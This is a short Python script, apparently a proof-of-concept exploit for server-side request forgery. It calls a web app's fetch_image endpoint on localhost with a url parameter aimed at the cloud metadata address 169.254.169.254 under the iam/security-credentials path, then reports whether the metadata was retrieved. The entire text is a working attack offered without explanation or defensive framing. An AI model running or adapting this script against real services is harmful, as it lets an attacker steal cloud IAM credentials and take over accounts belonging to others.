import requests

target_url = "http://localhost:5000/fetch_image?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
response = requests.get(target_url)

if response.status_code == 200:
    print("[+] SSRF successful! Metadata retrieved.")
else:
    print("[-] SSRF failed.")